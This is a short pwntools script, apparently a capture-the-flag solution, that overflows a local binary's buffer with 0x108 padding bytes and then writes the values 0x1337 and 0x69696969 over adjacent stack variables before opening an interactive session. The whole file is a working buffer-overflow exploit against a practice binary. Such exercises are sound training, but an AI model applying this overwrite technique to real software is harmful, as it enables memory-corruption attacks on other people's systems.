from pwn import *
binary = context.binary = ELF('./a.out')
p = process(binary.path)
p.sendline((0x110-0x8)*b'A' + p32(0x1337) + p32(0x69696969))
p.interactive()
#FINISHED
